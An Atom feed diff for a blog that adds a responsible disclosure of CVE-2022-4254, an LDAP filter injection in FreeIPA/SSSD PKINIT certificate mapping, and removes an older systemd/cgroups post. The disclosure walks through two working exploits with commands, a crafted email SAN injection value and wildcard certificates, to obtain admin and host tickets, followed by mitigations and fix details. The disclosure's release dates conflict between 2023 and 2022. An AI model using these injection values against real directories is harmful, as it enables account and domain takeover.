@@ -8,8 +8,545 @@
         <name>Fraser Tweedale</name>
         <email>frase@frase.id.au</email>
     </author>
-    <updated>2023-01-22T00:00:00Z</updated>
+    <updated>2023-02-02T00:00:00Z</updated>
     <entry>
+    <title>CVE-2022-4254: FreeIPA PKINIT certificate mapping vulnerability</title>
+    <link href="https://frasertweedale.github.io/blog-redhat/posts/2023-02-02-freeipa-pkinit-certmap-vuln.html" />
+    <id>https://frasertweedale.github.io/blog-redhat/posts/2023-02-02-freeipa-pkinit-certmap-vuln.html</id>
+    <published>2023-02-02T00:00:00Z</published>
+    <updated>2023-02-02T00:00:00Z</updated>
+    <summary type="html"><![CDATA[<h1 id="cve-2022-4254-freeipa-pkinit-certificate-mapping-vulnerability">CVE-2022-4254: FreeIPA PKINIT certificate mapping vulnerability</h1>
+<h2 id="executive-summary">Executive summary <a href="#executive-summary" class="section">§</a></h2>
+<p><a href="https://www.freeipa.org/">FreeIPA</a> supports the Kerberos <em>PKINIT</em> protocol extension (<a href="https://datatracker.ietf.org/doc/html/rfc4556">RFC
+4556</a>). PKINIT enables a client to authenticate to the KDC using
+an X.509 certificate and the corresonding private key, rather than a
+passphrase or keytab. FreeIPA uses <em>mapping rules</em> to map a
+certificate presented during a PKINIT authentication request to the
+corresponding principal. The mapping filter is vulnerable to LDAP
+filter injection. The search result can be influenced by values in
+the certificate, which may be attacker controlled. In the most
+extreme case, an attacker could gain control of the <code>admin</code> account,
+leading to full domain takeover.</p>
+<p>FreeIPA is <strong>not vulnerable in its default configuration</strong>. To
+exploit this bug requires:</p>
+<ul>
+<li>PKINIT is used in the environment, with certmap rules that are
+susceptible to LDAP filter injection via data from the client’s
+certificate; and</li>
+<li>A client certificate used for PKINIT includes data that result in
+the construction of an LDAP filter with a different meaning than
+the administrator intended. This is unlikely in general, but some
+use cases present a heightened risk, especially if the CA includes
+(or can be induced to include) client-supplied or
+attacker-controlled attributes in end-entity certificates.</li>
+</ul>
+<p>The issue was assigned <a href="https://access.redhat.com/security/cve/CVE-2022-4254">CVE-2022-4254</a>.</p>
+<h3 id="affected-versions">Affected versions <a href="#affected-versions" class="section">§</a></h3>
+<p>The problem is in <em>libsss_certmap</em>, which is part of <a href="https://sssd.io/">SSSD</a>.
+FreeIPA servers use this library in <code>ipa_kdb</code> Kerberos plugin
+implementation.</p>
+<p>The issue was introduced in <a href="https://sssd.io/release-notes/sssd-1.15.3.html">SSSD 1.15.3</a> (when
+<em>libsss_certmap</em> was introduced) and resolved in
+<a href="https://sssd.io/release-notes/sssd-2.3.1.html">SSSD 2.3.1</a>.</p>
+<p>All supported versions of RHEL 7 were affected (the fix was released
+on the RHEL 7.9 bugfix stream). RHEL 8.0 up to 8.3 (inclusive) were
+also affected (the fix was released to the still-supported streams).</p>
+<p>RHEL 8.4 onwards and RHEL 9 are not affected. No supported versions
+of Fedora are affected.</p>
+<h3 id="timeline">Timeline <a href="#timeline" class="section">§</a></h3>
+<ul>
+<li><strong>2017-07-25</strong>: <em>libsss_certmap</em> was released with <a href="https://sssd.io/release-notes/sssd-1.15.3.html">SSSD 1.15.3</a>.</li>
+<li><strong>2020-04-28</strong>: SSSD issue <a href="https://pagure.io/SSSD/sssd/issue/4180">pagure#4180</a> / <a href="https://github.com/SSSD/sssd/issues/5135">github#5135</a> was
+created, reporting a lack of sanitisation of filter substitutions in
+maprules.</li>
+<li><strong>2020-07-24</strong>: The sanitisation issue was fixed upstream and <a href="https://sssd.io/release-notes/sssd-2.3.1.html">SSSD
+2.3.1</a> is released, containing the fix.</li>
+<li><strong>2022-11-16</strong>: While reviewing a feature involving the use of
+PKINIT, I noticed that some versions of the <em>libsss_certmap</em> code
+did not seem to sanitise certificate data used in LDAP filters. I
+started to investigate.</li>
+<li><strong>2022-11-17</strong>: I succeed in exploiting the behaviour, and began
+internal discussions with Red Hat’s Platform Security
+engineering team.</li>
+<li><strong>2022-12-01</strong>: I sent my analysis to Red Hat’s Product Security
+team. <a href="https://access.redhat.com/security/cve/CVE-2022-4254">CVE-2022-4254</a> was reserved for this issue on the same
+day.</li>
+<li><strong>2023-01-24</strong>: Planned release of fix to RHEL 7.9 <code>sssd</code> package,
+in Batch Update 20. Details of the vulnerability were made public.</li>
+</ul>
+<h2 id="problem-description">Problem description <a href="#problem-description" class="section">§</a></h2>
+<p>FreeIPA supports <em>certificate mapping rules</em> for mapping
+certificates presented during PKINIT authentication to a Kerberos
+principal. Certmap rules are stored in the LDAP database under
+<code>cn=certmaprules,cn=certmap,{basedn}</code>. The <code>ipa_kdb</code> plugin uses
+<em>libsss_certmap</em> to process certmap rules. An example rule object:</p>
+<pre class="ldif"><code>dn: cn=certmap1,cn=certmaprules,cn=certmap,dc=ipa,dc=test
+cn: certmap1
+ipacertmapmaprule: (|(mail={subject_rfc822_name})(entryDN={subject_dn}))
+ipaenabledflag: TRUE
+objectClass: ipacertmaprule
+objectClass: top</code></pre>
+<p>The <code>ipacertmaprule</code> attribute is a string representation of an LDAP
+filter (<a href="https://datatracker.ietf.org/doc/html/rfc4515">RFC 4515</a>), with substitution templates in curly braces
+(e.g. <code>{subject_dn}</code>). Template substitution is performed by the
+<code>sss_certmap_get_search_filter</code> subroutine. The supported templates
+are described in <code>sss_certmap(5)</code>. They include:</p>
+<ul>
+<li><code>{cert!base64}</code> (base64 encoding of whole certificate)</li>
+<li><code>{issuer_dn}</code></li>
+<li><code>{subject_dn}</code></li>
+<li><code>{subject_rfc822_name}</code></li>
+<li><code>{subject_dns_name}</code></li>
+</ul>
+<p>The KDC uses the resulting filter within a bigger search filter that
+it uses to match the principal. The filter includes the requested
+principal name from the Kerberos <em>authentication service request
+(<code>AS_REQ</code>)</em>, and the maprule filter. The complete filter has the
+following structure (wrapped for readability):</p>
+<pre><code>(&amp;
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=REQUESTED_PRINCIPAL@REQUESTED_REALM)
+    (krbPrincipalName:caseIgnoreIA5Match:=REQUESTED_PRINCPAL@REQUESTED_REALM)
+  )
+  MAPRULE_FILTER_GOES_HERE
+)</code></pre>
+<p>Note that the requested principal is <strong>specified by the client</strong> in
+the Kerberos <code>AS_REQ</code>. This value <em>is properly escaped</em> where it is
+inserted in the filter. But it is important to note that the client
+can specify any principal the maprule filter fragment matches.</p>
+<h3 id="sanitisation-not-performed">Sanitisation not performed <a href="#sanitisation-not-performed" class="section">§</a></h3>
+<p>Some template substitutions are inherently safe, but some use values
+from the certificate that could contain characters with special
+meaning in LDAP filters. Of the substitutions listed above, only
+<code>{cert!base64}</code> is safe. The others could contain special
+characters (and there are still more that I did not list). Values
+that could contain special characters have to be sanitised
+(escaped). Specifically, the following characters must be replaced
+with a <em>hex escape sequence</em>:</p>
+<ul>
+<li><code>NUL</code> → <code>\00</code></li>
+<li><code>(</code> → <code>\28</code></li>
+<li><code>)</code> → <code>\29</code></li>
+<li><code>*</code> → <code>\2A</code></li>
+<li><code>\</code> → <code>\5C</code></li>
+</ul>
+<p>The affected versions of SSSD do not perform this sanitisation. As
+a consequence, the template substitutions can result in invalid
+filters (resulting in authentication failure) or filters that match
+the wrong principal entry (dangerous). The next two sections
+demonstrate two different exploit scenarios.</p>
+<div class="note">
+<p>LDAP filter injection has been assigned <a href="https://cwe.mitre.org/data/definitions/90.html">CWE-90</a> in the <em>Common
+Weakness Enumeration</em> database. Conceptually it is very similar to
+SQL injection (<a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a>).</p>
+</div>
+<h2 id="demo-1-attacker-supplied-rfc822name">Demo 1: Attacker-supplied <code>rfc822Name</code> <a href="#demo-1-attacker-supplied-rfc822name" class="section">§</a></h2>
+<p>We will issue a certificate with an attacker-supplied <code>rfc822Name</code>
+SAN value to an unprivileged user. The deployment has a plausible
+certmap rule with a structure that can be exploited to obtain a TGT
+for an attacker-specified user account, including highly privileged
+accounts such as <code>admin</code>.</p>
+<p>It is a fresh deployment running FreeIPA 4.6 on RHEL 7.9:</p>
+<pre class="shell"><code># cat /etc/redhat-release
+Red Hat Enterprise Linux Server release 7.9 (Maipo)
+
+# rpm -qa |grep ipa-
+ipa-client-4.6.8-5.el7.x86_64
+sssd-ipa-1.16.5-10.el7.x86_64
+ipa-server-4.6.8-5.el7.x86_64
+ipa-common-4.6.8-5.el7.noarch
+ipa-client-common-4.6.8-5.el7.noarch
+ipa-server-common-4.6.8-5.el7.noarch</code></pre>
+<h3 id="setup">Setup <a href="#setup" class="section">§</a></h3>
+<p>Setup steps establish the user account, certmap rules, certificate
+profiles and issuance policies required for the subsequent attack.
+I perform these steps using the <code>admin</code> account:</p>
+<pre><code># klist
+Ticket cache: KEYRING:persistent:0:0
+Default principal: admin@IPA.TEST
+
+Valid starting     Expires            Service principal
+28/11/22 23:00:19  29/11/22 23:00:07  ldap/rhel78-0.ipa.test@IPA.TEST
+28/11/22 23:00:09  29/11/22 23:00:07  krbtgt/IPA.TEST@IPA.TEST</code></pre>
+<p>Create the unprivileged user <code>alice</code>. She will be the subject
+principal to whom the certificate will be issued.</p>
+<pre class="shell"><code># ipa user-add alice --first Alice --last Able --password
+Password: XXXXXXXX
+Enter Password again to verify: XXXXXXXX
+------------------
+Added user &quot;alice&quot;
+------------------
+...</code></pre>
+<p>Add a new <code>mail</code> attribute to <code>alice</code>’s LDAP entry. This will
+enable us to issue a certificate from the internal CA that includes
+the value as an <code>rfc822Name</code> Subject Alternative Name value.</p>
+<pre class="shell"><code># echo &gt; mod.ldif &lt;&lt;EOF
+dn: uid=alice,cn=users,cn=accounts,dc=ipa,dc=test
+changetype: modify
+add: mail
+mail: &quot;bogus)(uid=admin)(cn=&quot;@ipa.test
+EOF
+
+# ldapmodify -Y GSSAPI &lt; mod.ldif
+modifying entry &quot;uid=alice,cn=users,cn=accounts,dc=ipa,dc=test&quot;</code></pre>
+<p>I had to add the new <code>mail</code> attribute via <code>ldapmodify</code> because the
+email validation performed by the IPA API does not admit all valid
+local-part values. But it is in fact a valid email address.</p>
+<div class="note">
+<p>The default access controls in FreeIPA do not allow non-admins to
+modify <code>mail</code> attributes, even in their own entry. But I use this
+approach because it is plausible for an organisation to have a
+system that allows employees to request a specific mail alias.
+Indeed we have such a system at Red Hat, although I don’t know if it
+would allow such an exotic value.</p>
+</div>
+<p>Next, add a <em>CA ACL</em> rule that permits certificate to be issued to
+user principals. For convenience we will use the included
+<code>caIPAserviceCert</code> profile. Typical real world user certificate
+scenarios would require a dedicated profile.</p>
+<pre class="shell"><code># ipa caacl-add users_caIPAserviceCert --usercat=all
+-------------------------------------
+Added CA ACL &quot;users_caIPAserviceCert&quot;
+-------------------------------------
+  ACL name: users_caIPAserviceCert
+  Enabled: TRUE
+  User category: all
+
+# ipa caacl-add-profile users_caIPAserviceCert --certprofile caIPAserviceCert
+  ACL name: users_caIPAserviceCert
+  Enabled: TRUE
+  User category: all
+  Profiles: caIPAserviceCert
+-------------------------
+Number of members added 1
+-------------------------</code></pre>
+<p>Finally add the certmap rule. It has a two-part <em>or-list</em> intended
+to match the <code>rfc822Name</code> from the certificate to the <code>mail</code>
+attribute, or else match the certificate subject DN to DN of the
+LDAP entry:</p>
+<pre class="shell"><code># ipa certmaprule-add certmap1 --maprule \
+    &quot;(|(mail={subject_rfc822_name})(entryDN={subject_dn}))&quot;
+--------------------------------------------------
+Added Certificate Identity Mapping Rule &quot;certmap1&quot;
+--------------------------------------------------
+  Rule name: certmap1
+  Mapping rule: (|(mail={subject_rfc822_name})(entryDN={subject_dn}))
+  Enabled: TRUE</code></pre>
+<div class="note">
+<p>The steps performed above are not part of the exploit itself, and
+they require administrator privileges to perform. They are
+presented as plausible configurations, the likes of which <em>may</em>
+exist (or not) in a customer’s environment.</p>
+</div>
+<h3 id="exploit">Exploit <a href="#exploit" class="section">§</a></h3>
+<p><code>alice</code> will request a certificate with the suspicious <code>rfc822Name</code>
+and <strong>acquire a TGT for the <code>admin</code> user</strong>. First obtain a TGT for
+<code>alice</code> (using password authentication):</p>
+<pre class="shell"><code>$ kinit alice
+Password for alice@IPA.TEST:</code></pre>
+<p>Create a new keypair and certificate signing request (CSR). The
+config causes the CSR to bear a SAN extension request containting
+the malicious <code>rfc822Name</code>:</p>
+<pre class="shell"><code>$ echo &gt; naughty.conf &lt;&lt;EOF
+[ req ]
+prompt = no
+encrypt_key = no
+distinguished_name = dn
+req_extensions = exts
+[ dn ]
+commonName = &quot;alice&quot;
+[ exts ]
+subjectAltName=email:\&quot;bogus)(uid=admin)(cn=\&quot;@ipa.test
+EOF
+
+$ openssl req -new -config naughty.conf \
+    -keyout naughty.key -out naughty.csr
+Generating a 2048 bit RSA private key
+..........+++
+......................+++
+writing new private key to &#39;naughty.key&#39;
+-----</code></pre>
+<p>Issue the certificate (this is a <em>self-service</em> certificate request,
+which FreeIPA allows, subject to CA ACLs):</p>
+<pre class="shell"><code>$ ipa cert-request naughty.csr \
+    --principal alice naughty.csr \
+    --certificate-out naughty.pem
+  Issuing CA: ipa
+  Certificate: MIIEPjCC...
+  Subject: CN=alice,O=IPA.TEST 202211171708
+  Subject email address: &quot;bogus)(uid=admin)(cn=&quot;@ipa.test
+  Issuer: CN=Certificate Authority,O=IPA.TEST 202211171708
+  Not Before: Tue Nov 29 04:42:58 2022 UTC
+  Not After: Fri Nov 29 04:42:58 2024 UTC
+  Serial number: 13
+  Serial number (hex): 0xD</code></pre>
+<p>Finally, use the new certificate and key to obtain a TGT <strong>for
+<code>admin</code></strong>:</p>
+<pre class="shell"><code>$ kinit -X X509_user_identity=FILE:naughty.pem,naughty.key admin
+
+$ klist
+Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
+Default principal: admin@IPA.TEST
+
+Valid starting     Expires            Service principal
+28/11/22 23:47:44  29/11/22 23:47:44  krbtgt/IPA.TEST@IPA.TEST</code></pre>
+<p>The exploit succeeds because the unescaped <code>rfc822Name</code> value
+results in a filter that matches the <code>admin</code> user (formatted for
+readability):</p>
+<pre><code>(&amp;
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=alice@IPA.TEST)
+    (krbPrincipalName:caseIgnoreIA5Match:=alice@IPA.TEST)
+  )
+  (|
+    (mail=&quot;bogus)
+    (uid=admin)
+    (cn=&quot;@ipa.test)
+    (entrydn=CN=alice,O=IPA.TEST 202211171708)
+  )
+)</code></pre>
+<h2 id="demo-2-wildcard-dns-name">Demo 2: Wildcard DNS name <a href="#demo-2-wildcard-dns-name" class="section">§</a></h2>
+<p>A wildcard certificate can be used to <strong>obtain a TGT for a different
+host principal</strong>.</p>
+<h3 id="setup-1">Setup <a href="#setup-1" class="section">§</a></h3>
+<p>Add a profile for issuing wildcard certificates. I will skip the
+details and instead refer to my <a href="https://frasertweedale.github.io/blog-redhat/posts/2017-06-26-freeipa-wildcard-san.html">blog post on this topic</a>.</p>
+<p>Add a host called <code>ipa.test</code>, a <em>host group</em> called <code>webservers</code>,
+and make <code>ipa.test</code> a member of <code>webservers</code>:</p>
+<pre class="host"><code># ipa host-add ipa.test --force
+----------------------
+Added host &quot;ipa.test&quot;
+----------------------
+  Host name: ipa.test
+  Principal name: host/ipa.test@IPA.TEST
+  Principal alias: host/ipa.test@IPA.TEST
+  Password: False
+  Keytab: False
+  Managed by: ipa.test
+
+# ipa hostgroup-add webservers
+----------------------------
+Added hostgroup &quot;webservers&quot;
+----------------------------
+  Host-group: webservers
+
+# ipa hostgroup-add-member webservers --hosts ipa.test
+  Host-group: webservers
+  Member hosts: ipa.test
+-------------------------
+Number of members added 1
+-------------------------</code></pre>
+<p>Add a <em>CA ACL</em> that allows <code>webservers</code> to be issued certificates
+via the <code>wildcard</code> profile:</p>
+<pre class="shell"><code># ipa caacl-add webservers_wildcard
+----------------------------------
+Added CA ACL &quot;webservers_wildcard&quot;
+----------------------------------
+  ACL name: webservers_wildcard
+  Enabled: TRUE
+
+# ipa caacl-add-host webservers_wildcard --hostgroup webservers
+  ACL name: webservers_wildcard
+  Enabled: TRUE
+  Host Groups: webservers
+-------------------------
+Number of members added 1
+-------------------------
+
+# ipa caacl-add-profile webservers_wildcard --certprofile wildcard
+  ACL name: webservers_wildcard
+  Enabled: TRUE
+  Profiles: wildcard
+  Host Groups: webservers
+-------------------------
+Number of members added 1
+-------------------------</code></pre>
+<p>Finally, add a certmap rule that uses SAN <code>dNSName</code> values to locate
+the principal:</p>
+<pre class="shell"><code># ipa certmaprule-add certmap2 \
+    --maprule &quot;(fqdn={subject_dns_name})&quot;
+--------------------------------------------------
+Added Certificate Identity Mapping Rule &quot;certmap2&quot;
+--------------------------------------------------
+  Rule name: certmap2
+  Mapping rule: (fqdn={subject_dns_name})
+  Enabled: TRUE</code></pre>
+<h3 id="exploit-1">Exploit <a href="#exploit-1" class="section">§</a></h3>
+<p>We will issue a wildcard certificate for <code>ipa.test</code>, and use it to
+obtain a TGT for a different host. You could use <em>Certmonger</em> to
+request the certificate, but I will interact directly with FreeIPA
+via the <code>ipa</code> client program. The operator is the <code>host/ipa.test</code>
+principal (I <code>kinit</code>ed using the host keytab):</p>
+<pre class="shell"><code>$ klist
+Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
+Default principal: host/ipa.test@IPA.TEST
+
+Valid starting     Expires            Service principal
+29/11/22 03:52:59  30/11/22 03:52:59  krbtgt/IPA.TEST@IPA.TEST</code></pre>
+<p>Create a keypair and CSR:</p>
+<pre class="shell"><code>$ openssl req -new -subj &#39;/CN=ipa.test/&#39; -nodes \
+    -keyout server.key -out server.csr
+Generating a 2048 bit RSA private key
+........................................................+++
+.....................................................................................................................+++
+writing new private key to &#39;server.key&#39;
+-----</code></pre>
+<p>Request the certificate, being sure to specify the <code>wildcard</code>
+profile:</p>
+<pre class="shell"><code>$ ipa cert-request server.csr \
+    --principal host/ipa.test \
+    --profile-id wildcard \
+    --certificate-out server.pem
+  Issuing CA: ipa
+  Certificate: MIIENTCC...
+  Subject: CN=ipa.test,O=IPA.TEST 202211171708
+  Subject DNS name: ipa.test, *.ipa.test
+  Issuer: CN=Certificate Authority,O=IPA.TEST 202211171708
+  Not Before: Tue Nov 29 09:14:09 2022 UTC
+  Not After: Fri Nov 29 09:14:09 2024 UTC
+  Serial number: 16
+  Serial number (hex): 0x10</code></pre>
+<p>Finally, use the new certificate and key to obtain a TGT for a
+<strong>different host</strong> whose <code>fqdn</code> attributes matches the LDAP
+substring filter <code>(fqdn=*.ipa.test)</code>. In this example I acquire the
+TGT for <strong><code>host/rhel78-0.ipa.test</code></strong> (one of the FreeIPA servers).</p>
+<pre class="shell"><code>$ kinit -X X509_user_identity=FILE:server.pem,server.key \
+    host/rhel78-0.ipa.test
+
+$ klist
+Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
+Default principal: host/rhel78-0.ipa.test@IPA.TEST
+
+Valid starting     Expires            Service principal
+29/11/22 04:15:52  30/11/22 04:15:52  krbtgt/IPA.TEST@IPA.TEST</code></pre>
+<p>The exploit succeeds because the unescaped wildcard <code>dNSName</code> value
+results in a <strong><em>substring match</em></strong> filter (formatted for
+readability):</p>
+<pre><code>(&amp;
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=host/rhel78-0.ipa.test@IPA.TEST)
+    (krbPrincipalName:caseIgnoreIA5Match:=host/rhel78-0.ipa.test@IPA.TEST)
+  )
+  (fqdn=*.ipa.test)
+)</code></pre>
+<p>The maprule filter matches any principal whose <code>fqdn</code> attribute ends
+in <code>.ipa.test</code>. This sub-filter could match multiple principle
+entries, but the <em>client-specified</em> principal name used in the
+<code>krbPrincipalName</code> and <code>ipaKrbPricipalAlias</code> filters select the one
+we want.</p>
+<p>If there are multiple SAN values of the relevant type, the order is
+important. The <em>last</em> value is used in the template substitution.
+In my certificate, the last value is <code>*.ipa.test</code> so the exploit
+succeeds. If the order was reversed, the exploit would not succeed.
+This is an implementation detail of SSSD; it might as well have used
+the first value but it just happened to be implemented this way.</p>
+<h2 id="discussion">Discussion <a href="#discussion" class="section">§</a></h2>
+<p>These exploits required a confluence of contributing factors to
+succeed. Deployments using PKINIT with exact certificate matching
+(the default) are also unaffected. The vulnerability only arises
+when the customer uses certmap rules. None are defined by default.
+Certmap rules (if they exist) are only <em>potentially</em> vulnerable;
+several other factors have to come together.</p>
+<p>The attacker must obtain a valid certificate from a trusted CA for a
+key they control. Except in limited cases (e.g. wildcard DNS names)
+the attacker must to be able to influence the attributes on the
+certificate. Only <em>free-form</em> string attributes are potentially
+problematic. These include DNS name, email address, SAN DN values,
+principle names, and perhaps others. And there have to be SSSD
+certmap rule template substitutions for the targeted attribute(s).</p>
+<p>Next, there had to be a certmap rule that substitutes the
+problematic value into the LDAP search filter. All filters that
+substitute free-form attributes are susceptible to exploitation.
+But in practice, <em>or-list</em> filters are <em>more susceptible</em> to
+exploitation than <em>and-list</em> or single-clause filters. This is
+because the attacker has more flexibility in how to make the filter
+match the target account. But as we saw in the wildcard <code>dNSName</code>
+example, even a single-clause filter fragment could be exploitable.</p>
+<div class="note">
+<p>The default ACIs allow any authenticated account to read certmap
+rule entries. This may aid attackers in working out the attack
+details.</p>
+</div>
+<p>Note that most <em>free-form</em> attributes have additional syntax rules
+imposed upon them. For example, a SAN <code>dNSName</code> value should look
+like a DNS name, and a SAN <code>rfc822Name</code> value should be a valid
+email address. But the raw ASN.1 data does not guarantee this.
+Even legal values can be problematic (as demonstrated). But if a
+trusted CA can be induced to issue certificates that contain
+<em>arbitrary</em> data in those free-form attributes, there is an even
+greater risk of exploitation.</p>
+<p>The use of the internal CA in this attack is incidental. The
+administrator can configure FreeIPA to trust external CAs for
+validating client PKINIT certificates. Any trusted CA can be used
+in the attack, if the attacker can cause it to issue certificates
+containing problematic values. Note that the KDC trusts the whole
+system trust store, not just the trusted CAs from the FreeIPA CA
+trust store. Certmap rules can be equipped with <em>matching rules</em> to
+restrict which issuers are allowed for PKINIT certificate matching,
+separate from CA trust for certification path verification purposes.</p>
+<h2 id="mitigations">Mitigations <a href="#mitigations" class="section">§</a></h2>
+<h3 id="use-exact-certificate-matching-do-not-use-certmap-rules">Use exact certificate matching / do not use certmap rules <a href="#use-exact-certificate-matching-do-not-use-certmap-rules" class="section">§</a></h3>
+<p>PKINIT uses exact certificate matching by default. If feasible, you
+can rely on that method and disable or delete any certmap rules.
+<code>ipa certmaprule-find</code> lists all certmap rules that have been
+defined. Use <code>ipa certmaprule-disable NAME</code> or <code>ipa certmaprule-del NAME</code> to disable or delete certmap rules, respectively.</p>
+<p>The main drawback to this approach is that each principal’s entry
+must have an up-to-date <code>userCertificate</code> attribute containing the
+user’s certificate(s). This increases the size of entries, and may
+have additional adminstrative overhead depending on how certificates
+are issued and managed.</p>
+<h3 id="audit-and-de-risk-certmap-rules">Audit and de-risk certmap rules <a href="#audit-and-de-risk-certmap-rules" class="section">§</a></h3>
+<p>Non-santised parameter substitution in an LDAP filter <em>or-list</em> is
+riskier than in <em>and-lists</em> lists or single . Replace certmap rules
+containing <em>or</em> lists with multiple, separate certmap rules.</p>
+<p>Ensure each rule is as specific as possible, and consider the
+possibility of outlier or malicious values in the certificate when
+designing certmap rules.</p>
+<h3 id="review-ca-trust-profiles-and-validation">Review CA trust, profiles and validation <a href="#review-ca-trust-profiles-and-validation" class="section">§</a></h3>
+<p>Review the kinds of data, especially user-supplied or user-writeable
+data, that can be included on certificates issued by CAs that are
+trusted for PKINIT purposes. Audit how those data are validated.</p>
+<p>Review and limit which CAs are trusted for PKINIT to only those that
+are necessary. If possible, consider using dedicated CAs for
+issuing the client certificates used for PKINIT. Use the certmap
+<em>matching rule</em> feature (not discussed here) to restrict the KDC to
+only allow certificates issued by the PKINIT CAs.</p>
+<h2 id="fix">Fix <a href="#fix" class="section">§</a></h2>
+<p>Lack of sanitisation in certmap LDAP filter construction was
+recognised as a bug in SSSD issue <a href="https://pagure.io/SSSD/sssd/issue/4180">pagure#4180</a> / <a href="https://github.com/SSSD/sssd/issues/5135">github#5135</a>.
+The framing of the issue was that legitimate values in the
+certificate were causing SSSD to construct invalid LDAP filters. It
+appears that the security implications were not recognised or
+discussed at that time.</p>
+<p>SSSD commit <a href="https://github.com/SSSD/sssd/commit/a2b9a84460429181f2a4fa7e2bb5ab49fd561274">a2b9a84460429181f2a4fa7e2bb5ab49fd561274</a>
+implemented the required sanitisation. <a href="https://sssd.io/release-notes/sssd-2.3.1.html">SSSD 2.3.1</a> was the first
+release containing the fix. Commit
+<a href="https://github.com/SSSD/sssd/commit/918fb32af6a271230bf87db47f78768edb9ca86c">918fb32af6a271230bf87db47f78768edb9ca86c</a> on
+<strong>2022-01-06</strong> backported the fix to the <code>sssd-1.16</code> branch, but
+there has not yet been a new release from this branch containing the
+fix.</p>
+<p>The SSSD team backported the fix to RHEL 7.9. It was included in
+Batch Update 20 which was released on <strong>2022-01-24</strong>. Fixes to
+extended support streams for RHEL 8.1 and 8.2 were also released on
+that day, meaning that the issue is now fixed in all supported
+versions of RHEL.</p>]]></summary>
+</entry>
+<entry>
     <title>Enabling Kubernetes feature gates in OpenShift</title>
     <link href="https://frasertweedale.github.io/blog-redhat/posts/2023-01-22-openshift-feature-gates.html" />
     <id>https://frasertweedale.github.io/blog-redhat/posts/2023-01-22-openshift-feature-gates.html</id>
@@ -2203,397 +2740,6 @@ assumption that it discourages messing around in production
 environments.</p>
 <p>In the meantime, now that I have worked out how to install my
 modified <code>runc</code> onto worker nodes, I will get on with testing it!</p>]]></summary>
-</entry>
-<entry>
-    <title>systemd, cgroups and subuid ranges</title>
-    <link href="https://frasertweedale.github.io/blog-redhat/posts/2021-06-09-systemd-cgroups-subuid.html" />
-    <id>https://frasertweedale.github.io/blog-redhat/posts/2021-06-09-systemd-cgroups-subuid.html</id>
-    <published>2021-06-09T00:00:00Z</published>
-    <updated>2021-06-09T00:00:00Z</updated>
-    <summary type="html"><![CDATA[<h1 id="systemd-cgroups-and-subuid-ranges">systemd, cgroups and subuid ranges</h1>
-<p>In my <a href="2021-05-27-oci-runtime-spec-runc.html">previous post</a> I experimented with <code>runc</code> as a way of
-understanding the behaviour of OCI runtimes. I ended up focusing on
-cgroup creation and the interaction between <code>runc</code> and <em>systemd</em>.
-The experiment revealed a critical deficiency: when using user
-namespaces the container’s cgroup is not owned by the user executing
-the container process. As a result, <em>systemd</em>-based workloads
-cannot run.</p>
-<p><code>runc</code> creates cgroups via systemd’s <em>transient unit API</em>. Could
-a container runtime use this API to control the cgroup ownership?
-Let’s find out.</p>
-<h2 id="how-runc-talks-to-systemd">How <code>runc</code> talks to <em>systemd</em> <a href="#how-runc-talks-to-systemd" class="section">§</a></h2>
-<p>The <em>Open Container Initiative (OCI)</em> <a href="https://github.com/opencontainers/runtime-spec">runtime spec</a> defines a
-low-level container runtime interface. OCI runtimes must create the
-Linux namespaces specified by an OCI config, including the cgroup
-namespace.</p>
-<p><code>runc</code> uses the systemd D-Bus API to ask systemd to create a cgroup
-scope for the container. Then it creates a cgroup namespace with
-the new cgroup scope as the root. We can see that <code>runc</code> invokes
-the <code>StartTransientUnit</code> API method with a name for the new unit,
-and a list of properties
-(<a href="https://github.com/opencontainers/runc/blob/v1.0.0-rc95/vendor/github.com/coreos/go-systemd/v22/dbus/methods.go#L198-L200">source code</a>):</p>
-<div class="sourceCode" id="cb1"><pre class="sourceCode go"><code class="sourceCode go"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// .../go-systemd/v22/dbus/methods.go</span></span>
-<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="kw">func</span> <span class="op">(</span>c <span class="op">*</span>Conn<span class="op">)</span> StartTransientUnitContext<span class="op">(</span></span>
-<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>  ctx context<span class="op">.</span>Context<span class="op">,</span> name <span class="dt">string</span><span class="op">,</span> mode <span class="dt">string</span><span class="op">,</span></span>
-<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  properties <span class="op">[]</span>Property<span class="op">,</span> ch <span class="kw">chan</span><span class="op">&lt;-</span> <span class="dt">string</span><span class="op">)</span> <span class="op">(</span><span class="dt">int</span><span class="op">,</span> <span class="dt">error</span><span class="op">)</span> <span class="op">{</span></span>
-<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> c<span class="op">.</span>startJob<span class="op">(</span></span>
-<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    ctx<span class="op">,</span> ch<span class="op">,</span></span>
-<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;org.freedesktop.systemd1.Manager.StartTransientUnit&quot;</span><span class="op">,</span></span>
-<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    name<span class="op">,</span> mode<span class="op">,</span> properties<span class="op">,</span> <span class="bu">make</span><span class="op">([]</span>PropertyCollection<span class="op">,</span> <span class="dv">0</span><span class="op">))</span></span>
-<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
-<p>Most of the unit configuration is passed as properties.</p>
-<h2 id="the-user-property">The <code>User=</code> property <a href="#the-user-property" class="section">§</a></h2>
-<p><a href="https://www.freedesktop.org/software/systemd/man/systemd.exec.html#User="><code>systemd.exec(5)</code></a> describes the properties that
-configure a systemd unit (including transient units). Among the
